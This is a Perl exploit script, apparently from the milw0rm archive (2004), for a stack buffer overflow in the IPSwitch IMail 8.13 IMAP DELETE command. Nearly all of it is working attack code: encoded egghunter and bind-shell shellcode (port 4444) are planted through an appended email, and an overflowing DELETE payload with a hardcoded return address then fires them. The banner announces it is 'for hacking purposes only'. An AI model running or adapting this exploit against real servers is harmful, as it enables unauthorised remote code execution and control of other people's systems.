#!/usr/bin/perl -w
###################################
#
# IPSwitch-IMail-8.13-DELETE
#
# Discovered by : Muts
# Coded by : Zatlander
# WWW.WHITEHAT.CO.IL
#
##################################
#
# Plain vanilla stack overflow in the DELETE command
# Restrictions:
#   - Need valid authentication credentials
#   - Input buffer only allows characters between x20 -> x7e
#
# Credits:
#   - http://www.metasploit.org  - HD Moore for the metasploit shellcode
#   - http://www.edup.tudelft.nl/~bjwever/menu.html - skylined for the ALPHA ascii shellcode generator
#   - http://www.hick.org - for the syscall egghunt code in the paper "Understanding Windows Shellcode"
#
##################################

use IO::Socket;
use Getopt::Std;
use Mail::IMAPClient;

print "Exploit for the IPSwitch IMail DELETE buffer overflow\n";
print "C0d3d by Zatlander\n";
print "Discovered by Muts\n";
print "WWW.WHITEHAT.CO.IL\n";
print "For hacking purposes only!!!\n\n";

# Find shellcode with signature "w00tw00t"; start from esp
# from 0 -> $egghunter = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIVSyBUco0OKbWdp00ptH0uXqRnkHH2a3PLMvtvqzm6NulfePabTiaxbycrb09Gjt5xkTySjeTsEzFmSo2eXyoKRA";
$egghunter = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkN44skpmkt7fPTpptx0UXpBLKkx1Q3PLMtT4QxMVN5lc5sQSDxqyrjSW2VYUJRUXkp9SjVdT5KVosKrWxioKRA";

# Real shellcode: bind shell on port 4444 ( ./alpha edx < shellcode.bin )
$shellcode = "JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLjH2vUP7puPQCQEV6aGnkbLWT28NkpEWLlKpT35QhgqKZlKPJvxLKQJWPuQXkKSdrSyLKgDLKuQJNVQ9okLP1KpLlP8kPBT7wyQXOVmvahGZKl25kSLwTGdqeKQlK2zUts1jKSVnktL0KNkaJWlUQxkLK7tnkUQM8zKgrVQYP1OqNQMQKkreXWpSnSZp03i1tlKGilKSkvlLKQK5Lnk7kLKckTH0SSXLNpN6nJLKOJvK9IWK1ZLuPfawps0Rwv63cMYiuJHDguPuPS0Np7qWp7pnV6ywhYwMttYt0Yym5QYK62inDvzd0Kwy4nMDniyXYUYkENMHKxmylgKpWPSVRSovS4ruPckLMpKupRqKOYGK9YOoyKsLMBUTTRJs7Ryv1RsYoTtNokOv534pYk9dDNnyrxrtkgWPTKOtwIoRutpfQkp2ppPrpF0spPPaPv09oRuFLniYWuaYKScpSe86bC07a3lmYIpSZVpRpQGyoruQ4QCF7kOv5thBsSdSgIoRuUpNiYWPhpCRmStwpoyXcLGyjDqIPnmQlQ4NLaz7e69zSlkNgJZosXlPTkvQT7TTP1TQvYWpDWTul5QUQLIcLTdRhK9SLQ4RlmY1letPPLMSt5tFpqDrppQRqCaSqSa2iBqRqRspQKO45uPbH0rKNNS4VKOpU5TyoXPLIyvKO45S0QxnMN9fexNYov5S4oyHCbJKOKOTvkOzsyorU30BHl0MZfdaOkORu7tFQyKPSIo8PA";

getopts("h:u:p:", \%args);

if ((!defined $args{h}) || (!defined $args{u}) || (!defined $args{p})) {
   print "Usage: $0 -h [host] -u [username] -p [password]\n";
   exit;}

$usr  = $args{u};
$pwd  = $args{p};
$host = $args{h};

# jb +20; jnb +20  -> jump over return address (0x21 is first ascii safe offset)
$jmp21 = "r!s!";

# 0x6921526A -> pointer to "CALL [EDX+8]" ends up in return address
##########################################################################
# This should hopefully be the only version dependent variable here.
# Find an ASCII safe address pointing to a CALL [EDX+8] for your OS
##########################################################################
$calledx8 = "jR!i";

# aAA aligns ESP with the egghunter shellcode (popad, pop, pop)
$asciieh = "aAA" . $egghunter;
$asciisc = "w00tw00t" . $shellcode;
$email =
   "From: \"The guy hacking you\" <a\@b.com>\r\n" .
   "To: \"Poor You\" <b\@c.com>\r\n" .
   "Subject: $asciisc\r\n" .
   "Date: Wed, 3 Nov 2004 14:45:11 +0100\r\n" .
   "Message-ID: <000101c4c1acdcndj6d69b90$5e01a8c0\@snorlax>\r\n" .
   "Content-Type: text/plain;\r\n\tcharset=\"us-ascii\"\r\n" .
   "Content-Transfer-Encoding: 7bit\r\n" .
   "\r\n" .
   $asciisc;

$payload = "A" x 236 . $jmp21 x 3 . $calledx8 . "S" x 29 . $asciieh . "\r\n";

print "Login in to $host as $usr/$pwd\n";
my $imap = Mail::IMAPClient->new( Server => $host, User => $usr, Password=> $pwd) or die "Cannot connect: $@";
print "count: " . $imap->message_count("Inbox") . "\n";
print "Sending EGG\n";
$imap->select("Inbox") or die "Could not select: $@\n";
my $uid = $imap->append( "Inbox", $email ) or die "Cannot append: $@";
$msg =  $imap->message_string($uid) or die "Cannot get message: $@";
#$msg =  $imap->body_string($uid) or die "Cannot get message: $@"; 
#print "retrieving $uid back: $msg\n";

print "Overflowing DELETE\n";
$imap->delete($payload) or die "Cannot delete: $@n";

print("Finished...\n");

# milw0rm.com [2004-11-12]